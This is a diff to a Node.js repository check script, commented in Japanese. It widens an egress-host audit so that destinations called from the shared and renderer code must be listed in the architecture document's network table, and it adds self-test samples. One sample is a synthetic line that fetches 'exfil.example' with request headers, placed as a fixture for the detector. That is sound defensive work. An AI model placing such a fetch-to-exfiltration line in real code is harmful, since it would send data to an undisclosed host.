@@ -29,6 +29,9 @@
 const { execFileSync } = require('node:child_process');
 const fs = require('node:fs');
 const path = require('node:path');
+// 「何が送信か」の名前は lint-network-targets と 1 つの一覧を共有する。§3.3 の照合が
+// 別の一覧を持てば、必ずどちらかに無い名前が出る (2026-09-09 に 4 つ抜けていた)。
+const { NETWORK_CALL_NAMES } = require('./lint-network-targets.cjs');
 
 const REPO_ROOT = path.resolve(__dirname, '..');
 
@@ -1036,6 +1039,32 @@ function selfTest() {
   }
 
   /*
+   * **送信文脈の規則そのものに標本を通す** (2026-09-09)。上の 3 件は実物の木を読むので、
+   * 「renderer の fetch が数えられる」「引用の URL は数えない」という規則の両側は、合成の
+   * 標本でしか確かめられない。2 件目は `api.cursor.com` が 2026-09-09 まで台帳の外にいた
+   * 実在の形 (shared の ALL_CAPS 定数 + jsonFetch)。
+   */
+  const archNow = readFileSafe(path.join(REPO_ROOT, 'docs/ARCHITECTURE.md')) ?? '';
+  const sampleCases = [
+    ['renderer の素の fetch に台帳に無い宛先 → 鳴る', [{ rel: 'src/renderer/network/x.ts', text: "await fetch('https://exfil.example/x', { headers });" }], 1],
+    ['★ shared の ALL_CAPS 定数を経由した jsonFetch → 鳴る (cursor の形)', [{ rel: 'src/shared/api/z.ts', text: "const API = 'https://zzz.example';\nexport async function f(jsonFetch) {\n  return jsonFetch(`${API}/x`);\n}" }], 1],
+    ['引用・出典の URL (送信の呼び出しが無い) → 数えない', [{ rel: 'src/renderer/data/k.ts', text: "export const K = [{ title: 'x', url: 'https://cite.example/paper' }];" }], 0],
+    ['案内リンク (openExternal) → 数えない', [{ rel: 'src/renderer/pages/P.tsx', text: "void window.serviceHub.openExternal('https://help.example/');" }], 0],
+    ['.tsx の fetch も読む', [{ rel: 'src/renderer/pages/P.tsx', text: "const r = await fetch('https://page.example/api');" }], 1],
+    ['main は送信文脈に無くても字面で数える (従来どおり)', [{ rel: 'src/main/clients/q.ts', text: "const LINK = 'https://link.example/help';" }], 1],
+    ['台帳に在る宛先なら鳴らない', [{ rel: 'src/renderer/network/x.ts', text: "await fetch('https://api.github.com/user');" }], 0],
+    ['コメントの中の URL は数えない', [{ rel: 'src/renderer/network/x.ts', text: "// await fetch('https://old.example/x')\nawait fetch(url);" }], 0],
+    ['4 行より前の呼び出しは文脈に入らない', [{ rel: 'src/renderer/network/x.ts', text: "await fetch(url);\n\n\n\nconst doc = 'https://far.example/';" }], 0],
+    ['一覧の別名 (timedFetch) も送信', [{ rel: 'src/renderer/web-shim.ts', text: "const res = await timedFetch('https://shim.example/x', init);" }], 1],
+  ];
+  for (const [label, sample, expected] of sampleCases) {
+    const got = verifyEgressHosts(archNow, sample).failures.length;
+    const ok = got === expected;
+    if (!ok) failed += 1;
+    console.log(`  ${ok ? '✓' : '✗'} egress (送信文脈): ${label}: ${got} 件 (期待 ${expected})`);
+  }
+
+  /*
    * **`readonly` の欄を読めること。** 2026-09-01 まで読めておらず、
    * `readonly` で書かれた payload interface は欄が空集合になっていた。
    */
@@ -1234,6 +1263,16 @@ function verifyIpcChannels(archText) {
  *
  * `src/main/**` の実行コード (コメントを落とす) から `https?://<host>` を集め、
  * §3.3 の Host 欄か、下の除外台帳に在ることを求める。
+ *
+ * ## 2026-09-09 の追記 —— ブラウザ版が走査の外だった
+ *
+ * 上の走査は `src/main` だけで、`src/shared` / `src/renderer` (ブラウザ版はここから
+ * 直接送る) は誰も見ていなかった。実測: `api.cursor.com` (Admin API キーを Bearer で
+ * 載せる。両ビルドで送る) が `src/shared/api/cursor.ts` の ALL_CAPS 定数に在り、§3.3 に
+ * 無かった —— 「下記以外のホストへの接続は存在しない」は嘘だった。`docs/SECURITY_AUDIT.md`
+ * は同じ表の手書きの写し (12 行) をさらに古いまま持っていた (`lint:docs` が写しを禁じる)。
+ * 走査は `src` 全体になり、shared / renderer は送信文脈だけを数える (下の
+ * `egressHostsInFile` の注記)。
  */
 const EGRESS_NOT_FETCHED = {
   'www.youtube.com': '画面に出す視聴 URL を組み立てるだけ (youtube.ts)。main は fetch しない',
@@ -1289,33 +1328,103 @@ function invariantRowCount(archText) {
   return max === 0 ? null : max;
 }
 
-function verifyEgressHosts(archText) {
+/**
+ * **送信文脈の宛先** (`src/shared` / `src/renderer` 用)。
+ *
+ * この 2 つの木は引用・出典・案内リンクの URL を何千件も持つ (学術コーパス・法令・
+ * 相談窓口) ので、`src/main` のように字面を全部数えると台帳が引用で埋まる。そこで
+ * 「その行か直前 3 行に送信の呼び出し (`NETWORK_CALL_NAMES` —— lint-network-targets と
+ * 同じ 1 つの一覧) があるか、その行が使う ALL_CAPS の定数が URL を持つか」で絞る。
+ *
+ * ## 限界 (書かずに置くと「見張っているつもり」になる)
+ *
+ * 組み立て (`url: \`${base}/…\``) と送信 (`f(httpReq.url)`) を別モジュールに分けた形
+ * (`shared/ai/providers.ts`) はここでは拾わない —— あちらは宛先が利用者の設定で決まる
+ * ので、どう絞っているかを `lint:network-targets` の台帳 (`REVIEWED`) が 1 件ずつ持つ。
+ * `const u = 'https://…'; fetch(u)` のように小文字の変数へ一度置いた形も拾わない。
+ */
+const SEND_CONTEXT_LINES = 3;
+const SEND_CALL = new RegExp(`\\b(?:${NETWORK_CALL_NAMES.join('|')})\\s*(?:<[^<>]*>)?\\(`);
+const HOST_LITERAL = /https?:\/\/([A-Za-z0-9._-]+)/g;
+const URL_CONST = /\bconst ([A-Z][A-Z0-9_]*)\s*(?::\s*string)?\s*=\s*['"`]https?:\/\/([A-Za-z0-9._-]+)/;
+
+/** コメントを落とす (注記の中の URL で鳴らさない)。行数は保つ —— 文脈の窓が行で数えるため。 */
+function stripComments(src) {
+  return src
+    .replace(/\/\*[\s\S]*?\*\//g, '')
+    .split('\n')
+    .map((l) => (/^\s*(\/\/|\*)/.test(l) ? '' : l));
+}
+
+/** 1 ファイル分の宛先。`mode` は `'all'` (字面を全部) か `'send'` (送信文脈だけ)。 */
+function egressHostsInFile(text, mode) {
+  const code = stripComments(text);
+  const hosts = new Set();
+  if (mode === 'all') {
+    for (const m of code.join('\n').matchAll(HOST_LITERAL)) hosts.add(m[1]);
+    return hosts;
+  }
+  const consts = new Map();
+  for (const line of code) {
+    const m = URL_CONST.exec(line);
+    if (m) consts.set(m[1], m[2]);
+  }
+  for (let i = 0; i < code.length; i++) {
+    const ctx = code.slice(Math.max(0, i - SEND_CONTEXT_LINES), i + 1).join('\n');
+    if (!SEND_CALL.test(ctx)) continue;
+    for (const m of code[i].matchAll(HOST_LITERAL)) hosts.add(m[1]);
+    for (const [name, host] of consts) {
+      if (new RegExp(`\\b${name}\\b`).test(code[i])) hosts.add(host);
+    }
+  }
+  return hosts;
+}
+
+/** 走査する木と、その木での数え方。`src/main` は全字面 (2026-09-01 から)、残りは送信文脈 (2026-09-09 から)。 */
+const EGRESS_TREES = [
+  { dir: 'src/main', mode: 'all', ext: /\.ts$/ },
+  { dir: 'src/shared', mode: 'send', ext: /\.tsx?$/ },
+  { dir: 'src/renderer', mode: 'send', ext: /\.tsx?$/ },
+];
+
+function* walkEgressTree(dir, ext) {
+  for (const name of fs.readdirSync(dir).sort()) {
+    const p = path.join(dir, name);
+    if (fs.statSync(p).isDirectory()) {
+      if (name !== '__tests__') yield* walkEgressTree(p, ext);
+    } else if (ext.test(name)) {
+      yield p;
+    }
+  }
+}
+
+/**
+ * `sample` を渡すと木を歩かず、その `{ rel, text }` の並びを同じ規則 (木ごとの数え方と
+ * 拡張子) で読む —— self-test が合成の標本を流すため。規則は 1 つ、入口が 2 つ。
+ */
+function verifyEgressHosts(archText, sample) {
   const failures = [];
-  const lines = archText.split('\n');
   const documented = documentedEgressHosts(archText);
 
   const found = new Map();
-  const walk = (dir) => {
-    for (const name of fs.readdirSync(dir).sort()) {
-      const p = path.join(dir, name);
-      if (fs.statSync(p).isDirectory()) {
-        if (name !== '__tests__') walk(p);
-      } else if (name.endsWith('.ts')) {
-        const src = readFileSafe(p) ?? '';
-        // コメントを落としてから見る (注記の中の URL で鳴らさない)。
-        const code = src
-          .replace(/\/\*[\s\S]*?\*\//g, '')
-          .split('\n')
-          .filter((l) => !/^\s*(\/\/|\*)/.test(l))
-          .join('\n');
-        for (const m of code.matchAll(/https?:\/\/([A-Za-z0-9._-]+)/g)) {
-          if (!found.has(m[1])) found.set(m[1], new Set());
-          found.get(m[1]).add(path.relative(REPO_ROOT, p));
-        }
+  const note = (host, rel) => {
+    if (!found.has(host)) found.set(host, new Set());
+    found.get(host).add(rel);
+  };
+  if (sample) {
+    for (const { rel, text } of sample) {
+      const tree = EGRESS_TREES.find((t) => rel.startsWith(`${t.dir}/`));
+      if (!tree || !tree.ext.test(rel)) continue;
+      for (const host of egressHostsInFile(text, tree.mode)) note(host, rel);
+    }
+  } else {
+    for (const tree of EGRESS_TREES) {
+      for (const p of walkEgressTree(path.join(REPO_ROOT, tree.dir), tree.ext)) {
+        const rel = path.relative(REPO_ROOT, p).split(path.sep).join('/');
+        for (const host of egressHostsInFile(readFileSafe(p) ?? '', tree.mode)) note(host, rel);
       }
     }
-  };
-  walk(path.join(REPO_ROOT, 'src/main'));
+  }
 
   for (const [host, files] of [...found].sort()) {
     if (documented.has(host)) continue;
@@ -1490,7 +1599,7 @@ function main() {
         : ''),
   );
   console.log(
-    `Verified ${egress.scanned} literal host(s) in src/main against the §3.3 egress matrix (${egress.documented} documented)`,
+    `Verified ${egress.scanned} host(s) in src (main: every literal / shared + renderer: send context) against the §3.3 egress matrix (${egress.documented} documented)`,
   );
   console.log(`Verified ${channels.registered} IPC channel(s) all have a §1.4 contract row`);
 
